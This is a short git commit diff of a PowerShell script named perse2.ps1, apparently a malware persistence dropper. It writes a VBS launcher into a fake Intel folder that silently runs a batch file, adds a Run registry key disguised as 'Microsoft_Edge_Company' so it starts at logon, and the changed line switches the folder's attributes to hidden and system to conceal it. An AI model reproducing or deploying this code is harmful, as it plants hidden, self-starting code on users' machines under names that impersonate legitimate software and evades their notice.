a8bc80316ac0d49baba66392bf7dc35574f94021
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:58:25 -0500

    Update perse2.ps1

--- perse2.ps1
+++ perse2.ps1
@@ -9,5 +9,5 @@ set objshell = createobject("wscript.shell")
 objshell.run "C:\Intel\Profiles/IE/IEX\MSDLSIM.bat",vbhide
 "@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles\IE\IEX\MSDLSIM.vbs; cd C:\Intel\Profiles\IE\IEX; ./MSDLSIM.vbs
 cd C:\
-attrib -s -r -h -a intel
+attrib +s +r +h +a intel
 exit
